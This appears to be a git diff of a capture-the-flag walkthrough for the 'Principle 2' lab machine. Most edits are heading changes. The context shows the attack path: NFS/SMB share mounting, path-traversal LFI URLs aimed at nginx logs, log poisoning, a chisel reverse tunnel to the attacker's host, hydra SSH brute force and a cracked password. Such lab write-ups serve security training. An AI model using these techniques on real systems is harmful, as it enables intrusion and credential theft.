@@ -17,7 +17,7 @@ This time it was a medium level machine, and to solve [Principle 2][2], I had to
 
 And, as always, once completed the box, it's time to write my walkthough.
 
-# Annotations
+## Annotations
 
 >In this article we are going to asume the following ip addresses:
 >
@@ -26,12 +26,13 @@ And, as always, once completed the box, it's time to write my walkthough.
 >Target machine (victim, [Principle 2][2] box): 10.0.0.2
 {: .prompt-info}
 
-# Warnings
+## Warnings
 
-Take a snapshot of the machine just after a fresh install.
-You may need it later.
+>Take a snapshot of the machine just after a fresh install.
+>You may need it later.
+{: .prompt-info}
 
-# Enumeration
+## Enumeration
 
 Let's see what services are running:
 
@@ -58,14 +59,14 @@ PORT      STATE SERVICE
 
 We can see trhee interesting services: web service, rpc and nfs.
 
-## Web service
+### Web service
 
 If we browse to the machine, we will find the default apache webpage:
 
 ![Default apache web page](hmv-principle2-default-apache-web-page.png)
 *Default apache web page*
 
-## RPC/NFS
+### RPC/NFS
 
 If you find nfs then, probably, you can list and download (maybe upload) files.
 Let's take a look:
@@ -87,6 +88,8 @@ $ sudo mount -t nfs 10.0.0.2:/var/backups /tmp/backups -o nolock
 $ sudo mount -t nfs 10.0.0.2:/home/byron /tmp/byron -o nolock
 ```
 
+#### /home/byron
+
 ```
 $ ls -la /tmp/byron
 ...
@@ -101,19 +104,21 @@ drwxr-xr-x 3 1001   1001 4096 Nov 23 07:13 .local
 
 After examining the files, the only interesting files that we found are `mayor.txt` and `memory.txt`.
 
-`mayor.txt` tells us a little about the relation between Byron and Hermanubis:
-
 ```
 $ cat /tmp/byron/mayor.txt
 Now that I am mayor, I think Hermanubis is conspiring against me, I guess he has a secret group and is hiding it.
 ```
 
-`memory.txt` tells us about Hermanubis lost his password, and the most interesting, Byron keeps a record (a backup, maybe?) of each neighbor password encoded in hexadecimal.
+`mayor.txt` tells us a little about the relation between Byron and Hermanubis:
 
 ```
 $ cat /tmp/byron/memory.txt
 Hermanubis told me that he lost his password and couldn't change it, thank goodness I keep a record of each neighbor with their number and password in hexadecimal. I think he would be a good mayor of the New Jerusalem.
 ```
+
+`memory.txt` tells us about Hermanubis lost his password, and the most interesting, Byron keeps a record (a backup, maybe?) of each neighbor password encoded in hexadecimal.
+
+#### /var/backups
 
 Let's take a look to `/backups`:
 
@@ -142,7 +147,7 @@ $ ls /tmp/backups
 And we see that there are a lot of text files naming with numbers.
 Filenames seems like a code, doesn't?
 
-## SMB
+### SMB
 
 Now, let's take a look at smb:
 
@@ -161,6 +166,8 @@ $ enum4linux -a 10.0.0.2
 
 We can see that we can read in `/public`, and we found the user `hermanubis` and we can't read (or write) in `/hermanubis`.
 Let's mount them and take a look:
+
+#### public
 
 ```
 $ sudo mount -t cifs //10.0.0.2/public /tmp/public
@@ -220,6 +227,8 @@ AMYNTAS:        But what does this tell us about the nature of the universe, whi
 STRATON:        That is the next question we must undertake to answer. We begin with the self because that is what determines our existence as individuals; but the self cannot exist without that which surrounds it. The citizen lives within the city; and the city lives within the cosmos. So now we must apply the principle we have discovered to the wider world, and ask: if man is like a machine, could it be that the universe is similar in nature? And if so, what follows from that fact?
 ```
 
+#### hermanubis
+
 ```
 sudo mount -t cifs //10.0.0.2/hermanubis /tmp/hermanubis -o username=hermanubis
 ```
@@ -257,7 +266,7 @@ $ cat prometheus_message.txt
 I have set up a website to dismantle all the lies they tell us about the city: thetruthoftalos.hmv
 ```
 
-# thetruthoftalos.hmv
+## thetruthoftalos.hmv
 
 Ok, now that we have a new domain, we append it to our `/etc/hosts`:
 
@@ -271,7 +280,7 @@ If we browse to `thetruthoftalos.hmv` we will found nothing (literally):
 ![thetruthoftalos.hmv index.html](hmv-principle2-thetruthoftalos-hmv-index-html.png)
 *thetruthoftalos.hmv index.html*
 
-## Directory enumeration
+### Directory enumeration
 
 We will search for resources on our new host:
 
@@ -285,7 +294,7 @@ $ gobuster dir -u http://thetruthoftalos.hmv --wordlist /usr/share/wordlists/dir
 /uploads              (Status: 301) [Size: 169] [--> http://thetruthoftalos.hmv/uploads/]
 ```
 
-## index.php
+### index.php
 
 ![thetruthoftalos.hmv index.php](hmv-principle2-thetruthoftalos-hmv-index-php.png)
 *thetruthoftalos.hmv index.php*
@@ -295,7 +304,7 @@ We can type the name of a god and we will see info about it.
 >Talks about twelve gods, but, there are fourteen ;)
 {: .prompt-info}
 
-## Path traversal/LFI (Local File Inclusion)
+### Path traversal/LFI (Local File Inclusion)
 
 We can't access to `/uploads`, but we can load the file of a god by requesting it in the url.
 If we look at the url that is showed when we insert the name of a god, we will see that maybe vulnerable to path traversal and/or a LFI.
@@ -317,7 +326,7 @@ http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//....
 http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/nginx/error.log
 ```
 
-## Log poisoning
+### Log poisoning
 
 As the `access.log` and `error.log` files are publicly accessible, we will try a log poisoning:
 
@@ -365,7 +374,7 @@ $ export SHELL=bash
 $ stty rows 56 columns 256
 ```
 
-## User flag
+### User flag
 
 We have Hermanubis' password for SMB, so let's see if he has the same password for his user:
 
@@ -410,7 +419,7 @@ Ok, so we know that Melville has a 32 character password.
 All txt files in `/var/backup` have 32 characters, so let's assume that Melville is using an hexadecimal password that is stored in Byron's backup.
 And we need a way to exploit this.
 
-## SSH
+### SSH
 
 If we chek the running services, we will find a running ssh service on port 345:
 
@@ -431,7 +440,7 @@ tcp          LISTEN        0             128                           [::]:345 
 
 We can stablish a reverse proxy using chisel and try to brute force the ssh authentication with hydra.
 
-## The dictionary
+#### The dictionary
 
 The first thing we are going to need to perform this attack it's to create a dictionary with all the neighbors passwords:
 
@@ -441,7 +450,7 @@ $ cat /tmp/backups/*.txt > /tmp/neighbors_passwords.txt
 $ exit
 ```
 
-## Chisel
+#### Chisel
 
 We check which version of chisel we need:
 
@@ -477,7 +486,7 @@ And now, we will start the chisel client on [Principle 2][2]:
 $ ./chisel client 10.0.0.1:8080 R:22222:127.0.0.1:345
 ```
 
-## Hydra
+#### Hydra
 
 Once stablished the reverse proxy we will bruteforce the password from our host using hydra:
 
@@ -490,7 +499,7 @@ $ cat /tmp/melville_password.txt
 ... password: 1bd5528b6def9812acba8eb21562c3ec
 ```
 
-# Melville
+## Melville
 
 We connect as Melville using ssh:
 
@@ -553,7 +562,7 @@ As the time stored in `/opt/users.txt` it's our login time, we an assume that `/
 And, if we look closely, we can see that we have write permissions because we are in the `talos` group.
 So we can try to hijack this file in order to get the root flag.
 
-# Hijacking
+### Hijacking
 
 We will override the `/usr/local/share/report` content with a simple bash script that retrieves the root flag:
 
